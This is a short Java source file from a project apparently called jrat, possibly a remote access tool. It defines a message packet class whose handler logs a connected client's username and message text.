package net.jrat.core.packet.client;

import net.jrat.core.connection.Connection;
import net.jrat.core.packet.IPacket;
import net.jrat.utils.Logger;

public class C1PacketMessage implements IPacket
{
	private static final long serialVersionUID = 1L;
	
	private String message;
	
	public C1PacketMessage(String message)
	{
		this.message = message;
	}
	
	@Override
	public void execute(Object object) throws Exception
	{
		final Connection connection = (Connection) object;
		
		Logger.space();
		Logger.log("message from " + connection.informations.username);
		{
			Logger.startFrequence();
			
			Logger.log(this.message);
			
			Logger.stopFrequence();
		}
		Logger.log("message from " + connection.informations.username);
		Logger.space();
	}
}